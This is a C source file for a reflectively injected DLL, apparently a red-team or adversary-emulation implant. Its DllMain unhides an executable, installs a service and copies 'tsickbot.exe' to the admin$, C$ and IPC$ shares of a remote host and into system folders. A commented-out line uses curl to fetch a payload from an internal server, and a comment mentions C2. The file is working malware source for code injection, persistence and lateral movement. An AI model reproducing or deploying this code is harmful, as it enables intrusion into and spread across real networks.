//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "Service.h"
#include "WriteContents.h"

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;

//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	char* requestUri;
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		// if you want to curl the file fomr another server instead of copying radiance.png down with c2
		//WinExec("curl -o C:\\Users\spagano\\AppData\\Roaming\\WNetval\\radiance.png http://192.168.0.4:8000/radiance.png", 0);
		UnHideExecutable();
		InstallService();
		CopyFile(L"C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\tsickbot.exe", L"\\\\dorothy\\admin$\\tsickbot.exe", FALSE);
		CopyFile(L"C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\tsickbot.exe", L"\\\\dorothy\\C$\\tsickbot.exe", FALSE);
		CopyFile(L"C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\tsickbot.exe", L"\\\\dorothy\\IPC$\\tsickbot.exe", FALSE);
		CopyFile(L"C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\tsickbot.exe", L"%SytemDrive%\\tsickbot.exe", FALSE);
		CopyFile(L"C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\tsickbot.exe", L"%SystemRoot%\\tsickbot.exe", FALSE);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}